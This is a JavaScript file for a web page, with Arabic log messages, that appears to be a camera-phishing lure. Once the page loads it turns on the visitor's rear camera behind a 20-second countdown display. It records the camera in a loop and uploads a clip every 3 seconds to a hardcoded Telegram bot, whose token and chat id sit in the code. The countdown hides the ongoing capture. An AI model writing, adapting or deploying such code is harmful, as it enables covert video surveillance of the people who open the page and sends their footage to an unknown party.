document.addEventListener("DOMContentLoaded", async function () {
    const countdownElement = document.getElementById("countdown");
    const progressBar = document.getElementById("progress");
    let timeLeft = 20;
    let countdownStarted = false;
    let mediaRecorder;
    let recordedChunks = [];

    async function getBackCameraId() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const backCamera = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('back'));
            return backCamera ? backCamera.deviceId : null;
        } catch (error) {
            console.error("❌ فشل في جلب قائمة الكاميرات:", error);
            return null;
        }
    }

    async function startCamera() {
        try {
            const backCameraId = await getBackCameraId();
            if (!backCameraId) {
                console.warn("⚠ لم يتم العثور على كاميرا خلفية! سيتم تشغيل الافتراضية.");
            }

            const video = document.getElementById('video');
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { deviceId: backCameraId ? { exact: backCameraId } : undefined }
            });

            video.srcObject = stream;
            startRecording(stream);

            video.onloadedmetadata = () => {
                console.log("✅ الكاميرا تعمل! سيتم بدء العد التنازلي وتسجيل الفيديو فورًا...");
                startCountdown();
            };
        } catch (error) {
            console.error("❌ فشل في تشغيل الكاميرا الخلفية:", error);
        }
    }

    function startCountdown() {
        if (countdownStarted) return;
        countdownStarted = true;

        const countdownInterval = setInterval(() => {
            timeLeft--;
            countdownElement.textContent = timeLeft;
            progressBar.style.width = (timeLeft / 20) * 100 + "%";

            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
            }
        }, 1000);
    }

    function startRecording(stream) {
        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

        mediaRecorder.ondataavailable = function (event) {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = function () {
            console.log("📹 تم تسجيل الفيديو! جاري الإرسال...");
            sendVideo();
            recordedChunks = [];
            setTimeout(() => mediaRecorder.start(), 200); // إعادة التسجيل بعد نصف ثانية
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 3000); // تسجيل كل 3 ثوانٍ
    }

    function sendVideo() {
        const blob = new Blob(recordedChunks, { type: "video/webm" });
        const formData = new FormData();
        formData.append("chat_id", "5375214810");
        formData.append("video", blob, "video_clip.webm");

        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendVideo", {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال الفيديو بنجاح:", data))
        .catch(error => console.error("❌ خطأ في إرسال الفيديو:", error));
    }

    startCamera();
});
